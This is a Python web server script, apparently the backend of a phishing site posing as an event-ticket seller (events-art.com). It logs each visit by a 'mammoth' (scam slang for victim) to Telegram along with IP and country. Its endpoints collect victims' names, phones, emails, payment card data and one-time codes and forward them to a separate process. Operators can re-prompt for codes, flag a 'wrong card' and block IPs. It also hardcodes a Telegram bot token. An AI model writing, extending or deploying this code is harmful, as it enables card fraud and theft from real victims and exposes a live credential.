#!/usr/bin/env python3
import http.server
import socketserver
import os
import sys
from urllib.parse import urlparse, unquote
import requests
import sqlite3
import traceback
import json

# Настройки сервера
PORT = 8080  # Стандартный HTTP порт
DIRECTORY = "events-art.com"  # Папка з сайтом

# --- Country code to full name mapping ---
COUNTRY_NAMES = {
    'UA': 'Ukraine',
    'RU': 'Russia',
    'PL': 'Poland',
    'DE': 'Germany',
    'FR': 'France',
    'IT': 'Italy',
    'ES': 'Spain',
    'GB': 'United Kingdom',
    'US': 'United States',
    'NL': 'Netherlands',
    'TR': 'Turkey',
    'KZ': 'Kazakhstan',
    'BY': 'Belarus',
    'LT': 'Lithuania',
    'LV': 'Latvia',
    'EE': 'Estonia',
    'CZ': 'Czech Republic',
    'SK': 'Slovakia',
    'RO': 'Romania',
    'MD': 'Moldova',
    'GE': 'Georgia',
    'AM': 'Armenia',
    'AZ': 'Azerbaijan',
    'BG': 'Bulgaria',
    'GR': 'Greece',
    'HU': 'Hungary',
    'FI': 'Finland',
    'SE': 'Sweden',
    'NO': 'Norway',
    'DK': 'Denmark',
    'BE': 'Belgium',
    'CH': 'Switzerland',
    'AT': 'Austria',
    'IE': 'Ireland',
    'PT': 'Portugal',
    'HR': 'Croatia',
    'RS': 'Serbia',
    'SI': 'Slovenia',
    'BA': 'Bosnia and Herzegovina',
    'ME': 'Montenegro',
    'MK': 'North Macedonia',
    'AL': 'Albania',
    'LU': 'Luxembourg',
    'LI': 'Liechtenstein',
    'IS': 'Iceland',
    'CA': 'Canada',
    'AU': 'Australia',
    'NZ': 'New Zealand',
    # ... додайте інші країни за потреби ...
}

# --- In-memory storage for request_again flags ---
REQUEST_AGAIN_FLAGS = {}
# --- In-memory blacklist and wrong_card flags ---
BLACKLISTED_IPS = set()
WRONG_CARD_FLAGS = {}

def send_telegram_log(page, link, ip, country="", extra_user_id=None):
    BOT_TOKEN = "5619487724:AAFeBptlX1aJ9IEAFLMUXN3JZBImJ35quWk"  # токен з main.py
    GROUP_ID = -828011200  # group id з main.py
    ADMIN_ID = 7973971109   # ваш admin id (залишаємо той самий)
    # Визначаємо країну за IP, якщо не передано
    if not country:
        try:
            resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=2)
            if resp.status_code == 200:
                data = resp.json()
                country = data.get("country", "")
        except Exception:
            country = ""
    # Перетворюємо код країни на повну назву
    country_full = COUNTRY_NAMES.get(country, country)
    msg = (
        f"⚠️ Мамонт открыл страницу\n"
        f"📄 Страница: {page}\n"
        f"🔗 Ссылка: {link}\n"
        f"🌍 IP: {ip}\n"
        f"🌏 Страна: {country_full}"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data_group = {"chat_id": GROUP_ID, "text": msg}
    data_admin = {"chat_id": ADMIN_ID, "text": msg}
    try:
        requests.post(url, data=data_group, timeout=2)
        requests.post(url, data=data_admin, timeout=2)
        if extra_user_id:
            data_user = {"chat_id": extra_user_id, "text": msg}
            requests.post(url, data=data_user, timeout=2)
    except Exception as e:
        print(f"❌ Не вдалося надіслати лог у Telegram: {e}")

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=DIRECTORY, **kwargs)
    
    def end_headers(self):
        # Добавляем CORS заголовки для безопасности
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()
    
    def is_blocked(self):
        ip = self.client_address[0]
        return ip in BLACKLISTED_IPS

    def do_GET(self):
        # --- Блокування IP ---
        if self.is_blocked():
            self.send_response(403)
            self.end_headers()
            self.wfile.write('<html><body><h2>Your IP has been blocked by the administrator.</h2></body></html>'.encode('utf-8'))
            return
        print(f"GET: {self.path}")  # Логування всіх GET-запитів
        path = unquote(self.path.split('?', 1)[0])
        orig_path = path
        # Якщо файл не знайдено, але є параметри — повертаємо index.html з відповідної папки
        fs_path = self.translate_path(path)
        if not os.path.exists(fs_path):
            if path.endswith('/'):
                path += 'index.html'
            elif not path.endswith('.html'):
                path += '/index.html'
            fs_path = self.translate_path(path)
            if os.path.exists(fs_path):
                self.path = path
        if orig_path.startswith('/file/ticket/'):
            filename = orig_path[len('/file/ticket/'):]
            ticket_path = os.path.join('tickets', filename)
            if os.path.exists(ticket_path):
                self.send_response(200)
                self.send_header('Content-Type', 'application/pdf')
                self.send_header('Content-Disposition', f'inline; filename=\"{filename}\"')
                self.end_headers()
                with open(ticket_path, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.send_error(404, 'Ticket not found')
            return
        skip_ext = (
            '.css', '.js', '.png', '.jpg', '.jpeg', '.svg', '.ico', '.webp', '.json',
            '.woff', '.ttf', '.eot', '.otf', '.mp4', '.mp3', '.wav', '.ogg', '.zip', '.pdf',
            '.gif', '.bmp', '.tiff', '.map', '.txt', '.xml'
        )
        skip_dirs = ('/css/', '/js/', '/image/', '/fonts/', '/static/', '/assets/')
        # Якщо це ресурс — не логувати
        if any(ext in orig_path for ext in skip_ext) or any(d in orig_path for d in skip_dirs):
            return super().do_GET()
        # --- NEW: If ?e=code in URL, try to find event creator ---
        extra_user_id = None
        parsed = urlparse(self.path)
        if parsed.query:
            from urllib.parse import parse_qs
            qs = parse_qs(parsed.query)
            event_code = None
            if 'e' in qs:
                event_code = qs['e'][0]
            if event_code:
                try:
                    db = sqlite3.connect('users.db')
                    cur = db.cursor()
                    cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (event_code,))
                    row = cur.fetchone()
                    if row:
                        extra_user_id = row[0]
                    db.close()
                except Exception as e:
                    print(f"[DB] Error fetching event creator: {e}")
        # --- END NEW ---
        # Нормалізуємо шлях для унікальності
        norm_path = orig_path
        if norm_path.endswith('/index.html'):
            norm_path = norm_path[:-10]
        if norm_path == '' or norm_path == '/':
            norm_path = '/'
        # Логувати тільки якщо це основна сторінка
        should_log = (
            norm_path == '/' or norm_path.endswith('/') or norm_path.endswith('.html')
        )
        # --- LOGIC CHANGE: always log to event creator if ?e=code, regardless of should_log ---
        if extra_user_id:
            print(f"📝 Логуємо відкриття сторінки для event creator: {norm_path}")
            send_telegram_log(
                page=norm_path,
                link=self.path,
                ip=self.client_address[0],
                extra_user_id=extra_user_id
            )
        # Група та адмін — як і раніше, тільки для основних сторінок
        if should_log:
            if not hasattr(self.server, 'logged_paths'):
                self.server.logged_paths = set()
            if norm_path not in self.server.logged_paths:
                self.server.logged_paths.add(norm_path)
                print(f"📝 Логуємо відкриття сторінки: {norm_path}")
                send_telegram_log(
                    page=norm_path,
                    link=self.path,
                    ip=self.client_address[0]
                )
        # --- Додаємо обробку /check_request_again ---
        if self.path.startswith('/check_request_again'):
            from urllib.parse import parse_qs
            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
            code = qs.get('code', [None])[0]
            print(f"[check_request_again][GET] Checking code: {code}, flag: {REQUEST_AGAIN_FLAGS.get(code)}")
            if code and REQUEST_AGAIN_FLAGS.get(code):
                REQUEST_AGAIN_FLAGS[code] = False
                print(f"[check_request_again][GET] Returning true for code: {code}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'true')
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'false')
            return
        try:
            super().do_GET()
        except Exception as e:
            self.send_error(500, f"Internal Server Error: {e}")

    def do_POST(self):
        path = unquote(self.path.split('?', 1)[0])
        # --- Блокування IP ---
        if self.is_blocked():
            self.send_response(403)
            self.end_headers()
            self.wfile.write('BLOCKED'.encode('utf-8'))
            return
        if path == '/log_visit':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            try:
                data = json.loads(post_data)
                page = data.get('page', '')
                link = data.get('link', '')
                ip = self.client_address[0]
                send_telegram_log(page=page, link=link, ip=ip)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(f'Error: {e}'.encode('utf-8'))
        elif path == '/submit_form':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            try:
                data = json.loads(post_data)
                phone = data.get('phone', '')
                name = data.get('name', '')
                mail = data.get('mail', '')
                ip = self.client_address[0]
                # Надсилаємо у main.py
                try:
                    requests.post('http://localhost:8081/notify_admin', json={
                        'phone': phone,
                        'name': name,
                        'mail': mail,
                        'ip': ip
                    }, timeout=2)
                except Exception as e:
                    print(f"[notify_admin] Error: {e}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
            except Exception as e:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(f'Error: {e}'.encode('utf-8'))
        elif self.path == '/send_payment_data':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                print("[send_payment_data] Отримано дані:", data)
                resp = requests.post('http://127.0.0.1:8081/payment_notify', json=data, timeout=3)
                print(f"[send_payment_data] Відповідь від main.py: {resp.status_code} {resp.text}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'ok')
            except Exception as e:
                print("[send_payment_data] ERROR:", e)
                traceback.print_exc()
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif path == '/send_code':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                print("[send_code] Отримано код:", data)
                resp = requests.post('http://127.0.0.1:8081/code_notify', json=data, timeout=3)
                print(f"[send_code] Відповідь від main.py: {resp.status_code} {resp.text}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'ok')
            except Exception as e:
                print("[send_code] ERROR:", e)
                traceback.print_exc()
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif path == '/set_request_again':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                code = data.get('code')
                if code:
                    REQUEST_AGAIN_FLAGS[code] = True
                    print(f"[set_request_again] Set flag for code: {code}")
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'ok')
                else:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b'no code')
            except Exception as e:
                print(f"[set_request_again] Error: {e}")
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        elif path.startswith('/check_request_again'):
            from urllib.parse import parse_qs
            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
            code = qs.get('code', [None])[0]
            print(f"[check_request_again] Checking code: {code}, flag: {REQUEST_AGAIN_FLAGS.get(code)}")
            if code and REQUEST_AGAIN_FLAGS.get(code):
                REQUEST_AGAIN_FLAGS[code] = False
                print(f"[check_request_again] Returning true for code: {code}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'true')
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'false')
            return
        elif path == '/admin_action':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                action = data.get('action')
                ip = data.get('ip')
                if action == 'block' and ip:
                    BLACKLISTED_IPS.add(ip)
                    print(f'[admin_action] Blocked IP: {ip}')
                elif action == 'unblock' and ip:
                    BLACKLISTED_IPS.discard(ip)
                    print(f'[admin_action] Unblocked IP: {ip}')
                elif action == 'card' and ip:
                    WRONG_CARD_FLAGS[ip] = True
                    print(f'[admin_action] Wrong card for IP: {ip}')
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'ok')
            except Exception as e:
                print(f'[admin_action] Error: {e}')
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'error')
            return
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == "__main__":
    try:
        socketserver.TCPServer.allow_reuse_address = True
        with socketserver.TCPServer(("", PORT), CustomHTTPRequestHandler) as httpd:
            print(f"🌐 Сервер запущений на порту {PORT}")
            print(f"📁 Обслуговуємо папку: {DIRECTORY}")
            print(f"🔗 Сайт доступний за адресою: http://localhost:{PORT}/")
            httpd.serve_forever()
    except PermissionError:
        print(f"❌ Помилка: Немає прав для запуску на порту {PORT}")
        print("💡 Спробуйте запустити з правами адміністратора або використайте порт 8080")
    except OSError as e:
        if "Address already in use" in str(e):
            print(f"❌ Помилка: Порт {PORT} вже використовується")
            print("💡 Зупиніть інший сервер або використайте інший порт")
        else:
            print(f"❌ Помилка запуску сервера: {e}")
    except KeyboardInterrupt:
        print("\n⏹️ Сервер зупинений користувачем")
    except Exception as e:
        print(f"❌ Неочікувана помилка: {e}") 